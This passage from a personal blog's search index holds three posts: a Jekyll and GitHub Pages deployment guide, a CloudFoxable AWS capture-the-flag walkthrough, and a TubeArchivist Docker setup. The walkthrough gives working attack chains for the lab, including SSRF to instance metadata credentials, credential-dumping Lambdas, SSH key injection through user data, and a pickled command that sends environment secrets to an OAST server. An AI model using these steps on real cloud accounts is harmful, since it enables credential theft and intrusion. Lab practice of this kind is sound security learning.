other settings from the domain registrar’s portal - specifically, linking the domain to GitHub’s server - which can be done by following this GitHub documentation. Subdirectory site, no domain rarr; If a repository other than &lt;username&gt;.github.io is used to serve a GitHub pages site, then the URL for reaching it will be https://&lt;username&gt;.github.io/&lt;repo-name&gt;. The issue is that the same is not possible with a domain, i.e., you can’t deploy a new repository as a subdirectory for the primary site. Subdomain site, custom domain → A completely separate repo can be used as a subdomain site for the primary domain by setting the appropriate subdomain in the settings. Given the primary domain is already set up with a GitHub pages site, this step is straightforward and allows hosting from a different repo. See also GitHub’s documentation. Subdirectory site, custom domain → As stated above, doing this isn’t possible from a separate repo; therefore, the site resources must be deployed from the same directory as the primary domain but inside a subfolder. Then, visiting that domain’s subdirectory will serve that site. Example - this blog site is deployed in the same manner https://tanishq.page/blog. The subdomain vs. subdirectory debate is a split decision across the internet. I’m not an SEO guru by any means, but the consensus seems to be that if you’re an established business, it’s okay to have a subdomain site, specifically for things like regional sites or alternate offerings, i.e., all cases where you want a different keyword association for the subdomain site than the primary domain. However, it’s generally better for individuals like myself to have a subdirectory since all keywords link to the same domain and boost SEO. Again, the guidance could be clearer since we also see established organizations like Google shifting some sites from a subdomain to a subdirectory. Many organizations also make the subdomain a pointer to the subdirectory for extra audience reach. All that to say - pick your poison and make an informed decision.Using a Static Site Generator - JekyllThis section is one of the main reasons behind this blog because there are fewer descriptive public instructions on Jekyll. I’m also focussing primarily on Jekyll since it’s pretty widely used and also the recommended generator to use with GitHub. I also don’t want to discuss deploying generic HTML/CSS/JS sites since all that is reasonably straightforward. For example, my site is a customized version of a theme from HTML5UP that I’ve slapped onto a GitHub repo. So, I’ll focus on Jekyll stuff, which is useful for creating a blog like mine.I choose Jekyll (or static site generators) because we - the people of CS - like our documentation, notes, blogs, information, etc., to stay in a simple and extensible format, Markdown. Jekyll takes markdown content and makes a beautiful website out of it (of course it’s gorgeous because of the work various people put behind designing Jekyll themes). A huge collection of themes is available to browse at JekyllThemes. My blog site (the one you’re reading) is based on the Chirpy theme (do check this project out; it’s amazing).Setup and Serve a Jekyll Site I’ll stick to instructions for Ubuntu, but just translate these for other distributions of linux or simply deploy it in a container :)The first step is the prerequisites. Here is a one-liner apt command for installing all dependencies →sudo apt update -y &amp;&amp; \\sudo apt install ruby-full build-essential zlib1g-dev g++ gcc make -yNext comes the installation of Jekyll itself →echo 'export GEM_HOME=\"$HOME/gems\"' &amp;&amp; \\echo 'export PATH=\"$HOME/gems/bin:$PATH\"' &amp;&amp; \\gem install jekyll bundlerWith the prerequisites out of the picture, simply clone or download your theme, make your changes, and then from the directory, run the following →bundle exec jekyll b -d servedirNow the site is built and is available for serving via the servedir directory, i.e., the directory that contains the HTML/CSS/JS for the site. In my experience, it’s best to generate this folder and move it around to serve via Apache, GitHub pages, or even plain old php -S 0.0.0.0:8000.Deploying Jekyll-based Site in a RepoUsually, all Jekyll-themed templates come with a GitHub action that builds the site using Jekyll (similar to the previous subsection) and deploys the built artifacts via GitHub pages. The associated GHA handles all the steps, including the deployment. For example, check out the workflow by Chirpy creators here.If the Jekyll template doesn’t have a GHA for deployment, the only option is to make a custom GHA with the steps outined under “Setup and Serve a Jekyll Site”. Then, use the created artifacts to manually upload directly to a repo branch or automatically through the action. Then, the repo can be set to serve a site via GitHub pages from that branch. In the case of a subdirectory, neither the generally available actions nor a custom one can deploy a site from one repo to another (from the subdirectory or subdomain repo to the primary repo). So, if we can dissect that problem, the resulting solutions can also be used for deploying to a single repo.Deploying a Jekyll Site as a SubdirectoryStatic sites can be generated as artifacts and uploaded to a branch or the same repo. Then those artifacts can be used on the repo where the subdirectory needs to be deployed. My site is built the same way; check out main and blog. There are multiple solutions to solving this problem, such as using git submodules, subtrees, or even manually doing the uploading from one repo to another. But obviously, we want to automate this.I used a GitHub Action solution that automatically pulls a generated site from my blog repo to my main site repo. I’m simply using git to clone my blog site and commit only the generated site part. This is possible since my repos are public (GitHub pages can only work on public repos in the free plan). For private repos, similar solutions must use GitHub personal access tokens (PATs). In my case, I’m relying on my repos being public and GHAs having their token for the repo they’re defined for.Designing the GHAsFor the blog site, I’m using a customized version of Chirpy’s GHA to build the site and push the generated content to the same repo →name: \"Build Site\"on: push: branches: - main - master workflow_dispatch:jobs: build: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v3 with: fetch-depth: 1 - name: Setup Pages id: pages uses: actions/configure-pages@v3 - name: Setup Ruby uses: ruby/setup-ruby@v1 with: ruby-version: 3 bundler-cache: true - name: Build site run: | rm -rf blog bundle exec jekyll b -d blog env: JEKYLL_ENV: \"production\" - name: Upload site run: | git config --global user.name \"github-actions[bot]\" git config --global user.email \"tanishq-github-actions[bot]@users.noreply.github.com\" git add -A git commit -m \"[bot] build blog\" git pushBasically, the action is manually executable due to the workflow_dispatch being present and automatically executable through changes in the blog repo code. Ultimately, the action commits the generated files in the blog directory to the same repo. This means that if I locally run a php -S 0.0.0.0:8000 from the repo root, the site should be working at localhost:8000/blog/. For the site generator to work, the base URL for specifying paths for CSS and JS assets must be the blog directory, not the repo root. Setting this can be tricky based on the chosen Jekyll theme, as some might hardcode it to be the root, but others may have an option to specify the path. Chirpy has such an option for the record (check the _config.yml file for an example).Over on the main website repo, I have the following GitHub action →name: \"Integrate Blog\"on: push: branches: - main - master workflow_dispatch:jobs: build: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v3 - name: Pull blog run: | rm -rf blog git clone --depth=1 https://github.com/tanq16/blog_site mv ./blog_site/blog ./blog rm -rf blog_site - name: Deploy blog run: | git config --global user.name \"github-actions[bot]\" git config --global user.email \"tanishq-github-actions[bot]@users.noreply.github.com\" git add -A git commit -m \"auto-add blog\" git pushI clone the directory generated earlier on the other repo and commit it to the primary repo. This action can also be launched on demand.Again, this setup works for me and is one possible way to get the job done. It’s also a naive solution but worth setting up for simplicity. Otherwise, git submodules might be another good solution to try.Jekyll is Cool!The intent behind writing this blog was to share some information on deploying sites via Jekyll and GitHub pages in various scenarios. This helps people search about and debug Jekyll and GitHub pages, especially for hosting subdirectories. Jekyll is fantastic and allows building sites effortlessly, so I highly recommend it! Cheers!" }, { "title": "Cloudfoxable", "url": "/blog/posts/cloudfoxable/", "categories": "Lab Practice Notes, AWS Labs", "tags": "aws, lab, cloudfoxable, security", "date": "2023-06-25 18:22:00 -0400", "snippet": "Checkout the challenges over at GitHub.Setup &amp; First FlagMy initial setup starts with getting into my containerized security toolkit. From there, set up a sandbox account in the default organiz...", "content": "Checkout the challenges over at GitHub.Setup &amp; First FlagMy initial setup starts with getting into my containerized security toolkit. From there, set up a sandbox account in the default organization (security-testing) with access keys of a user with admin privileges. Then, the following in serial order →awsn sts get-caller-identity # check user access keyscd /persistgit clone https://github.com/BishopFox/cloudfoxable &amp;&amp; cd cloudfoxablecp terraform.tfvars.example terraform.tfvars # basic setup from cloudfoxable instructions# setupterraform initterraform applyThat gives terraform’s output with a command to set up a starting user and the first flag in step 3. The command that needs to be executed is the following →echo \"\" &gt;&gt; ~/.aws/credentials &amp;&amp; echo \"[cloudfoxable]\" &gt;&gt; ~/.aws/credentials &amp;&amp; echo \"aws_access_key_id = `terraform output -raw CTF_Start_User_Access_Key_Id`\" &gt;&gt; ~/.aws/credentials &amp;&amp; echo \"aws_secret_access_key = `terraform output -raw CTF_Start_User_Secret_Access_Key`\" &gt;&gt; ~/.aws/credentials &amp;&amp; echo \"region = us-west-2\" &gt;&gt; ~/.aws/credentialsNo flags are printed in the walkthrough since the correct value can be checked from the main.tf file with the following →grep -hiroE \"FLAG\\{[^\\{\\}]+?\\}\" . | sort -u Any aws command used as awsn is aliased to aws --no-cli-pager.It’s a secretWith cloudfox, the following commands solve the challenge →cloudfox aws secrets -p cloudfoxable # lists where it stored analysis and lootbat ~/.cloudfox/cloudfox-output/aws/&lt;ACCID&gt;-cloudfoxable/table/secrets.txt # list accessible secretsbat ~/.cloudfox/cloudfox-output/aws/&lt;ACCID&gt;-cloudfoxable/loot/pull-secrets-commands.txt # list commandsawsn --profile cloudfoxable --region us-west-2 ssm get-parameter --with-decryption --name /cloudfox/flag/its-a-secretWithout cloudfox, generic analysis can be done as follows →awsn iam list-attached-user-policies --user-name ctf-starting-user --profile cloudfoxableawsn iam get-policy --policy-arn \"arn:aws:iam::&lt;ACCID&gt;:policy/its-a-secret-policy\" --profile cloudfoxableawsn iam get-policy-version --version-id v1 --policy-arn \"arn:aws:iam::&lt;ACCID&gt;:policy/its-a-secret-policy\" --profile cloudfoxableawsn --region us-west-2 ssm get-parameter --with-decryption --name /cloudfox/flag/its-a-secret --profile cloudfoxableIt’s another secretThe challenge asks us to assume the role Ertz, which can be setup with the following command →cat &lt;&lt;EOF &gt;&gt; ~/.aws/config[profile ertz]region = us-west-2role_arn = arn:aws:iam::&lt;ACCID&gt;:role/Ertzsource_profile = cloudfoxableEOFThe ctf-starting-user had the SecurityAudit policy attached, so it can be used for analysis. That provides insight that Ertz would be able to retrieve the SSM parameter in concern to get the flag →awsn iam list-attached-role-policies --role-name Ertz --profile cloudfoxableawsn iam get-policy --policy-arn \"arn:aws:iam::&lt;ACCID&gt;:policy/its-another-secret-policy\" --profile cloudfoxableawsn iam get-policy-version --version-id v1 --policy-arn \"arn:aws:iam::&lt;ACCID&gt;:policy/its-another-secret-policy\" --profile cloudfoxableawsn --region us-west-2 ssm get-parameter --with-decryption --name /cloudfox/flag/its-another-secret --profile ertzBackwardsThis challenge requires us to know that the ARN of interest is arn:aws:secretsmanager:us-west-2:&lt;ACCID&gt;:secret:DomainAdministratorCredentials-SUFFIX.With cloudfox, the problem is super simple! First, the following gives the secrets available in the environment and the respective commands to retrieve them →cloudfox aws secrets -v3 -p cloudfoxableThe one that’s of concern here is related to the ARN the challenge is all about. With that command in hand, the next step is to figure out who has the permissions to retrieve that secret →cloudfox aws permissions -v2 -p cloudfoxable | grep secretThis tells us that the role Alexander-Arnold has the permissions to retrieve the secret we’re interested in. Finding who can assume this principal is also simple with the following →cloudfox aws role-trusts -v2 -p cloudfoxableThis shows that the ctf-starting-user has the permissions to assume Alexander-Arnold. Next, setting up a profile for this and assuming the role will allow listing the secret as follows →cat &lt;&lt;EOF &gt;&gt; ~/.aws/config[profile arnold]region = us-west-2role_arn = arn:aws:iam::&lt;ACCID&gt;:role/Alexander-Arnoldsource_profile = cloudfoxableEOFawsn secretsmanager get-secret-value --secret-id DomainAdministratorCredentials --region us-west-2 --profile arnoldWithout cloudfox, what’s happening in the background is something that can be explored manually with a little more effort. This is a good point to begin with gaad-analysis →awsn iam get-account-authorization-details --profile cloudfoxable &gt; cloudfoxable-gaad.jsonThis IAM dump contains everything in an AWS environment except for resource-based policies and SCPs and is a great analysis tool. The approach is slightly different here - unlike with cloudfox, it makes more sense to go in the opposite direction. Of course, that means a ton of manual evaluation (hence tooling helps), but the evaluation experience is worth it to some extent. So, we start by listing all principals (roles) that ctf-starting-user can assume, then manually check the permissions for each to find something interesting, and then check the policies to verify who can interact with the resource we’re interested in. Of course, even the first step involves looking at whether a role explicitly trusts our principal, or if our principal has assume-role permissions and the role trusts the account root. But all that is abstracted from the following commands →cat cloudfoxable.json | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal=={\"AWS\":\"arn:aws:iam::&lt;ACCID&gt;:user/ctf-starting-user\"})'# this gives info on the roles and their attached policies, checking which shows Arnold with the appropriate policycat cloudfoxable.json | jq '.Policies[] | select(.PolicyName==\"corporate-domain-admin-password-policy\")'# shows that retrieving the secret is allowedThen the steps are the same as with cloudfox.NeedlesThis challenge gives the role ramos as the starting point i.e., it can be assumed by ctf-starting-user.This challenge is straightforward where the task is to evaluate the permissions of the ramos role. First, the role is set up like before and the permissions are checked via the gaad as follows →cat cloudfoxable.json | jq '.RoleDetailList[] | select(.RoleName==\"arn:aws:iam::&lt;ACCID&gt;:role/ramos\")'# shows a couple read only policiesThe most sensitive read-only policy out of the three seems related to CloudFormation because that’s where secrets could potentially lie. So, by listing out the stacks and the template of the available stacks, the next flag is obtained. The steps are as follows →aws cloudformation describe-stacks --profile ramos --region us-west-2aws cloudformation get-template --stack-name cloudformationStack --profile ramos --region us-west-2RootThis challenge uses the starting point as the role Kent, which needs to get the root flag in the SSM parameter store.Now, no more differentiation between non-cloudfox and cloudfox-based methods. Let’s combine. Also, instead of working backward or forward, time to do both. After setting up the Kent role, the permissions of Kent are observed in policy root-policy1 which allows it to sts:AssumeRole on *.Permissions can also be checked via cloudfox using the following instead of relying on gaad-analysis &amp;rarrcloudfox aws permissions --principal Kent -p cloudfoxable -v2Next, get secrets and their respective AWS commands with cloudfox to keep an eye on the root parameter. With that in hand, search using cloudfox to get who can perform ssm:GetParameter &amp;rarrcloudfox aws permissions -p cloudfoxable -v2 | grep \"ssm:GetParameter\"This shows that role Lasso can get the root parameter via permissions in the important-policy. Also, Lasso’s trust policy establishes trust in the role Beard. Checking the details of Beard, it trusts the account root. This means all principals that have an assume-role permission can assume Beard i.e., Kent fits the bill. So, adding Beard as another role obtained via Kent and Lasso as one assumed via Beard, Lasso can be used to list the parameter and get the flag.Furls 1 &amp; 2This challenge starts with the ctf-starting-user and requires finding the Lambda function URL for the furls1 function and then the flag. Then, for the next phase, no other information except that we are after a Lambda function.cloudfox allows searching for numerous endpoints for App Runner, API Gateway, Cloudfront, EKS, ELB, Lambda, RDS, Redshift, and a couple more. With the interest in Lambda function URLs, it’s easy to enumerate all interesting endpoints with the following →cloudfox aws endpoints -p cloudfoxable -v2This gives the function URL for furls1, which can be called with cURL to retrieve the flag.The result from the previous command lists out another function URL (and that’s the only one), so trying cURL on the auth-me function, it prompts to send a GET request with a username and password as parameters. Trying to list out the function in question shows the username and password variables within the environment. That can be sent via cURL →awsn lambda list-functions --profile cloudfoxable --region us-west-2 | jq '.Functions[] | selectt(.FunctionName==\"auth-me\")' # get variables from environmentcurl \"https://xxxxxx.lambda-url.us-west-2.on.aws/?username=admin&amp;password=NotSummer2023\"This gives an incomplete flag in the body of the HTML received, with the placeholder there being the name of the principal that can also read the environment variables of username and password aside from the ctf-starting-user. This can be done by cloudfox with the following →cloudfox aws permissions -p cloudfoxable -v2 | grep \"lambda:ListFunctions\"This gives the role of interest as mewis, substituting which in the placeholder provides the correct flag.The topic is exposureThis challenge starts with ctf-starting-user and requires checking out public resources. This is also a good time to run the all-chekcs subcommand for cloudfox to cache all the checks for fast analysis. Looking through all available subcommands, resource-trusts can be used to check the permissions granted over specific resources.cloudfox aws resource-trusts -c -p cloudfoxable -v2The only resource that stands out most is the eventbridge-sns SNS topic since it allows public subscriptions. In this case, it has a condition to limit it to only those entities that come form a certain (our home) IP, which is a nice bit of security control added in the Cloudfoxable labs. Checking results from →cloudfox aws sns -c -p cloudfoxable -v2and reading the loot, the SNS topic can be subscribed to as follows →awsn --region us-west-2 sns subscribe --topic-arn arn:aws:sns:us-west-2:&lt;ACCID&gt;:eventbridge-sns --protocol http --notification-endpoint http://xxxxx.oast.fun --profile attackerA public interact.sh server can be used to retrieve the topic notification. With the subscription active, it can be confirmed with the resulting token on the OAST server in a request as follows →awsn --region us-west-2 sns confirm-subscription --token \"&lt;fromrequest&gt;\" --topic-arn arn:aws:sns:us-west-2:&lt;ACCID&gt;:eventbridge-sns --profile attackerAfter this, the lab will automatically send a publish message with sensitive information every 1 minute through Eventbridge schedules. This message is received on the OAST server and also gives the flag.Search 1 &amp; 2These challenges start with the ctf-starting-user and requires searching for an Elasticsearch domain and find a flag there. Next, it requires searching further within the ES domain to pivot beyond the Cloudfoxable environment.To start off, the easiest way to search for the exposed ES domain is via cloudfox →cloudfox aws endpoints -p cloudfoxable -v2Then using cURL, visit the domain and listing the indices and then visit each index, in this case webserver-logs provided what is necessary →curl -X GET \"https://search-pat-xxxxxx.us-west-2.es.amazonaws.com/_cat/indices?v\"curl -X GET \"https://search-pat-xxxxxx.us-west-2.es.amazonaws.com/webserver-logs/_search?pretty=true\"This gives the first flag and also has a base64 encoded token, decoding which gives a GitHub personal access token. This can be used to login to github, search for repositories and clone a repository as follows →echo $githubtoken | gh auth login --with-tokengh auth statusgh repo listgh repo clone cloudfoxable/super-secret-ML-stuff # login with un: cloudfoxable and pw as the PATcd super-secret-ML-stuff &amp;&amp; cat main.goThe main.go file contained the second flag.BastionThis challenge starts with the ctf-starting-user and sets the stage for SSM operations. It spins up an instance that can be connected to by ctf-starting-user. To get the details on the instance, the following helps →cloudfox aws instances -p cloudfoxable -v2With the SSM agent installed, this instance can be connected to using the following →awsn --region us-west-2 ssm start-session --target i-xxxxx --profile cloudfoxableChecking the STS credentials on the instance, it’s found that role reyna is granted to the instance. Using cloudfox to determine the permissions as follows →cloudfox aws permissions --principal reyna -p cloudfoxable -v2This shows that reyna had permissions to list and get objects from the cloudfoxable-bastion-xxxx bucket, with the flag contained within.VariableThis challenge requires starting from the bastion host and pivoting inside the network. cloudfox can help retrieve information about the network with the following →cloudfox aws elastic-network-interfaces -p cloudfoxable -v2This lists several ENIs, with one being an RDS network interface. It is also in the same VPC as the bastion host, which means it’s likely reachable internally. This can be further confirmed by looking up security groups, but it’s worth just naively trying to connect.The next thing needed is to get information about the database and search for credentials to connect. The network interfaces also list some related to Lambda functions with the name ...rds-sql-executor..., so looking at Lambda functions might give a clue about the credentials. cloudfox can help by looking at environment variables of Lambda functions in the following way →cloudfox aws databases -p cloudfoxable -v2 # gives the DNS endpoint for the RDS instancecloudfox aws env-vars -p cloudfoxable -v2This lists the RDS host, database name, password and username. Using those to connect to the RDS instance as follows →mysql -u admin -h cloudfox-rds-xxxx.xxxxx.us-west-2.rds.amazonaws.com -D cloudfoxxxxx -p # enter passwords&gt; show tables; # lists `credit_cards`&gt; select * from credit_cards;That gives the flag.Trust MeThis challenge requires setting up a GitHub repo that is trusted by “something” in the environment. The challenge asks to find a role that trusts this repo and use that role to get a flag. Roles can be listed with cloudfox and trusts between them can also be listed as follows →cloudfoxable aws principals -p cloudfoxable -v2cloudfoxable aws role-trusts -p cloudfoxable -v2Role trusts lists role t_rodman with trust established for the repo we created. Looking at t_rodman via gaad-analysis →cat cloudfoxable-gaad.json | jq '.RoleDetailList[] | select(.RoleName==\"t_rodman\")'# this gave an attached policy called trust-mecat cloudfoxable-gaad.json | jq '.Policies[] | select(.PolicyName==\"trust-me\")'This shows that a GitHub Action can be used to authenticate as t_rodman via sts:AssumeRoleWithWebIdentity from the repo in concern. Also, the role can get SSM parameters trust-*. With a little googling, this can be done via an action published by AWS. In the repo, a workflow can be set up as follows →name: cloudfoxableattackon: push: branches: [ main ]permissions: id-token: write contents: readjobs: AssumeRole: runs-on: ubuntu-latest steps: - name: clone repo uses: actions/checkout@v3 - name: set creds uses: aws-actions/configure-aws-credentials@v2 with: role-to-assume: arn:aws:iam::&lt;ACCID&gt;:role/t_rodman aws-region: us-west-2 - name: perform action run: | aws --region us-west-2 ssm get-parameter --with-decryption --name trust-meCommitting this to the repo runs the actions and the parameter value can be see in the Action logs, which is also the flag.WyattThis challenge starts with the bastion host from previous challenges, to provide an internal foothold. It needs us to scan for services in the VPC and figure out next steps to get a flag.To start, it’s best to scan for network-related items, ENIs, and instances (given we’re in a network). That gives an idea about the roles granted to the instances, so those roles can analyzed for permissions, which provides further hints into the type of services to look into. The following commands helped narrow down to objects of interest →cloudfox aws elastic-network-interfaces -p cloudfoxable -v2 # instances are of primary interestcloudfox aws network-ports -p cloudfoxable -v2 # shows open ports based on SGs for instances (IPs)cloudfox aws instances -p cloudfoxable -v2 # shows the instances and associated roles (get role/wyatt)cloudfox aws permissions --principal wyatt -p cloudfoxable -v2 # check permissions of wyattThis shows that role wyatt had access to perform some operations on DynamoDB table wyatt-table. The instance in concern has a public and private IP, but visiting the service via the bastion to keep it internal →nmap -Pn -p 12380 &lt;PrivateIP&gt; # potentially looks like a webservercurl http://&lt;PrivateIP&gt;:12380 # gives a classic SSRF application that takes in a URL and visits itSo, passing in the URL for IMDSv1 to get the credentials of wyatt as →curl http://&lt;PrivateIP&gt;:12380?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/wyattThis gave the credentials for wyatt using which a scan operation could be performed on the wyatt-table table as follows to get the flag →awsn dynamodb scan --table-name wyatt-table --region us-west-2 --profile wyattDouble TapThis challenge requires starting at ctf-starting-user and getting to a secret DT_Flag. The following cloudfox commands help narrow down analysis and search →cloudfox aws principals -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_asdf -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_esdf -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_qsdf -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_secret -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_xsdf -p cloudfoxable -v2cloudfox aws permissions --principal double_tap_zsdf -p cloudfoxable -v2cloudfox aws permissions --principal lambda_ec2 -p cloudfoxable -v2awsn ec2 describe-instances --region us-west-2 --profile cloudfoxable | jq '.Reservations[].Instances[] | select(.Tags[].Key==\"double_tap1\") | .InstanceId'cloudfox aws instances -p cloudfoxable -v2cloudfox aws role-trusts -p cloudfoxable -v2cloudfox aws permissions --principal ec2_privileged -p cloudfoxable -v2cat cloudfoxable-gaad.json | jq '.Policies[] | select(.PolicyName==\"ec2_privileged_policy\")'awsn ec2 describe-instances --region us-west-2 --profile cloudfoxable | jq '.Reservations[].Instances[] | select(.Tags[].Key==\"double_tap2\") | .InstanceId'This analysis gives the following potential attack path → ctf-starting-user can assume role double_tap_xsdf double_tap_xsdf can create and invoke Lambda functions and pass lambda_* roles Rolelambda_ec2 has full EC2 access if the resource has tag double_tap1 equal to true, which was true for an instance that had the ec2_privileged role attached to it ec2_privileged role can perform ssm:SendCommand and ssm:StartSession as long as the resource has the double_tap2 tag equal to true, which was true for the instance that had the double_tap_secret role attached double_tap_secret role could read the secret in concernA Lambda function can be deployed with the following code →import osdef lambda_handler(event, context): return dict(os.environ)Commands to execute for the Lambda attack are as follows →zip lambda_function.zip lambda_function.py# deploy functionawsn lambda create-function --function-name attackfunction --runtime python3.8 --role arn:aws:iam::&lt;ACCID&gt;:role/lambda_ec2 --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.zip --profile double_tap_xsdf# invoke functionawsn lambda invoke --function-name attackfunction --profile double_tap_xsdf outputfile# get credentialscat outputfile | jqWith these credentials, access to the instance that has the ec2_privileged role is needed. The instance has an open port 22, but it needs an SSH key. User data does not run after starting a stopped instance unless it is used as a cloud-init script, which can be defined as the following →#cloud-configcloud_final_modules: - [users-groups,always]users: - name: ec2-user ssh-authorized-keys: - ssh-ed25519 keydatakeydatakeydatakeydatakeydatakeydata user@hostThe key used can be generated as →ssh-keygen -t ed25519 -b 2048 # save as ec2_keyThe YAML content can be stored in a file userdatanormal.txt and then converted to base64 with →base64 userdatanormal.txt &gt; userdataencoded.txtThen, the following can be used to deploy a key using the session of lambda_ec2 →awsn ec2 stop-instances --instance-id i-0hshshshshhshs --region us-west-2 --profile lambda_ec2awsn ec2 modify-instance-attribute --instance-id i-0hshshshshhshs --attribute userData --value file:userdataencoded.txt --region us-west-2 --profile lambda_ec2awsn ec2 start-instances --instance-id i-0hshshshshhshs --region us-west-2 --profile lambda_ec2This instates the key into the instance and allows SSH-ing into the instance associated with the ec2_privileged role, which allows us to start an SSM session with the other instance with the double_tap2 tag and associated role double_tap_secret to read the secret flag →awsn ssm start-session --target i-06eeb27aff191127a --region us-west-2 --profile ec2_privilegedaws --region us-west-2 secretsmanager get-secret-value --secret-id DT_flag # from the instanceThat solves the challenge with the caveat that an ec2-instance-connect:sendSSHKey permission was required to be added.The topic is executionThis challenge starts with the role viniciusjr and requires us to access executioner flag in the SSM parameter store. The cloudfox analysis to help with this is as follows →cloudfox aws permissions --principal viniciusjr -p cloudfoxable -v2cloudfox aws sns -p cloudfoxable -v2viniciusjr has SNS read-only access. Listing out the SNS topic in the account, the executioner topic allows anyone to publish or subscribe to it via the resource policy as long as they’re in the same account. With the current permissions, it’s hard to establish a direct link between the topic and its Lambda trigger, but that’s generally common and we also have a Lambda function with the same name already. Solution Caveat → The challenge does not grant any role the ability to view Lambda execution logs to get a sense of what is being executed. Hence, it’s easier to look at the logs using a privileged role instead. This can also be fixed by adding a policy attachment to allow viewing of the CloudWatch Logs.Therefore, sending a message to the topic executes a Lambda function, the logs of which can be seen in CloudWatch. Therefore, invoking the following →awsn sns publish --topic-arn arn:aws:sns:us-west-2:&lt;ACCID&gt;:executioner --region us-west-2 --subject ls --message \"printenv\" --profile viniciusThis prints out the environment variables in the logs, which can be used to obtain the permissions of role ream, which can decrypt the SSM parameter in concern. That can be done like so, which gives the flag →awsn ssm get-parameter --with-decryption --name /cloudfoxable/flag/executioner --region us-west-2 --profile reamThat solves the challenge with the caveat that additional permissions were required to view the CloudWatch logs pertaining to Lambda execution.MiddleThis challenge starts with the role pepi and requires us to exploit misconfigurations to get to a flag. Solution Caveat → The challenge has a command execution python line commented in the consumer Lambda function. I had to uncomment that line to make the function exploitable. I didn’t find any other means to modify the Lambda function in concern (in case it was meant to be this). So, I uncommented that line and then deployed the infrastructure with Terraform.The following analysis was done to get some information about the attack path →cloudfox aws permissions --principal pepi -p cloudfoxable -v2cloudfox aws lambdas -p cloudfoxable -v2awsn lambda get-function --function-name producer --profile pepi --region us-west-2 # gives download location of codeawsn lambda list-event-source-mappings --profile cloudfoxable --region us-west-2cloudfox aws resource-trusts -p cloudfoxable -v2cloudfox aws sqs -p cloudfoxable -v2cloudfox aws env-vars -p cloudfoxable -v2cloudfox aws permissions --principal swanson -p cloudfoxable -v2The following information is collected → pepi can get information about the producer Lambda function, which has a code with a specific format that sends messages to an SQS queue internal_message_bus The internal_message_bus is used as a source mapping for the consumer Lambda function i.e., safe to say that a command send by the producer Lambda is stored in the internal_message_bus queue, which is dequeued by consumer Lambda and executed Theconsumer Lambda execution role is swanson, which has the permissions to read the lambda-sqs SSM parameter The internal_message_bus queue is a public queue that allow anyone to send and receive messagesThe code retrieved from producer Lambda can be used to create a payload, with the modification looking like →import pickleimport jsonimport base64command = input()pickled_command = pickle.dumps(command)encoded_pickled_command = base64.b64encode(pickled_command).decode('utf-8')payload = {'command': encoded_pickled_command}print(json.dumps(payload))The command to execute would be something like printenv which will be process by the above code to give a dumped JSON, which can be passed to the queue as follows →awsn sqs send-message --queue-url \"https://sqs.us-west-2.amazonaws.com/&lt;ACCID&gt;/internal_message_bus\" --message-body '{\"command\": \"gASVDAAAAAAAAACMCHByaW50ZW52lC4=\"}' --region us-west-2 --profile cloudfoxableLet the command be →python -c 'import http.client; conn = http.client.HTTPConnection(\"&lt;oast-server&gt;\"); import os; import base64; import json; data = json.dumps({\"content\":base64.b64encode(str(os.environ).encode()).decode(\"utf-8\")}); headers = {\"Content-type\":\"application/json\"}; conn.request(\"POST\",\"\",data,headers);'This can be generated into a payload and sent to the SQS queue, which in turn will send the base64 encoded version of the OS environment variables to the OAST server. These variables show the AWS environment variables related to swanson’s session in the Lambda execution logs, which can be used to read the SSM parameter /cloudfoxable/flag/lambda-sqs which gives the flag.This solves the challenge with the caveat that the consumer function code needed to be modified to allow for the execution of payloads." }, { "title": "Tube Archivist in Home Lab", "url": "/blog/posts/homelab-tubearchivist/", "categories": "Home Server", "tags": "tubearchivist, home-lab", "date": "2023-05-24 20:45:00 -0400", "snippet": "TubeArchivist is a YouTube media management platform that allows indexing, searching, and storing YouTube videos. It uses YT-DLP to download videos. It’s a comprehensive platform, but the primary a...", "content": "TubeArchivist is a YouTube media management platform that allows indexing, searching, and storing YouTube videos. It uses YT-DLP to download videos. It’s a comprehensive platform, but the primary advantage here is that it’s deployable via Docker, making it an awesome and easy addition to home labs.To run it as a containerized workload, start by setting up the directory as follows →mkdir -p $HOME/tubearchivist/{media,cache,redis,es}Then download the related Docker compose YAML from GitHub. Set the appropriate options in the file. An example final Docker compose template is as follows →services: tubearchivist: container_name: tubearchivist restart: unless-stopped image: bbilly1/tubearchivist ports: - 12008:8000 volumes: - /home/tanq/tubearchivist/media:/youtube - /home/tanq/tubearchivist/cache:/cache environment: - ES_URL=http://tubearchivist-es:9200 - REDIS_HOST=tubearchivist-redis - HOST_UID=1000 - HOST_GID=1000 - TA_HOST=192.168.1.82 # change this to your server IP - TA_USERNAME=tubearchivist # change this as necessary - TA_PASSWORD=tubearchivist # change this as necessary - ELASTIC_PASSWORD=tubearchivist # should be same as what's below - TZ=America/Chicago depends_on: - tubearchivist-es - tubearchivist-redis tubearchivist-redis: image: redis/redis-stack-server container_name: tubearchivist-redis restart: unless-stopped expose: - \"6379\" volumes: - /home/tanq/tubearchivist/redis:/data depends_on: - tubearchivist-es tubearchivist-es: image: bbilly1/tubearchivist-es container_name: tubearchivist-es restart: unless-stopped environment: - \"ELASTIC_PASSWORD=tubearchivist\" # should be same as what's above - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" - \"xpack.security.enabled=true\" - \"discovery.type=single-node\" - \"path.repo=/usr/share/elasticsearch/data/snapshot\" ulimits: memlock: soft: -1 hard: -1 volumes: - /home/tanq/tubearchivist/es:/usr/share/elasticsearch/data expose: - \"9200\"volumes: media: cache: redis: es:Running from this point here is pretty straightforward - simply run the following from the command line →docker compose up # using compose v2Otherwise, it can also be deployed as a stack in Portainer, which is my preferred way of deployment. One thing to note - in Portainer, if you specify a bind mount, it will automatically create the directories without the mkdir command. However, since Portainer usually runs as root within the container, it will prompt Docker to create the mount as root, which causes issues with the ElasticSearch and TubeArchivist setup due to permissions mismatch with the filesystem. So, it’s best to run the mkdir command before deploying the stack on Portainer to fix that issue.To be fair, while it can be used a full-fledged personal YouTube theater, for me the only use case is to download videos before a flight rather than getting YouTube premium. Still, the GUI helps a lot to get the videos easily and store them efficiently by channel in the HDD or a mounted flash drive (which is what I do). With that, go get your YouTube game in 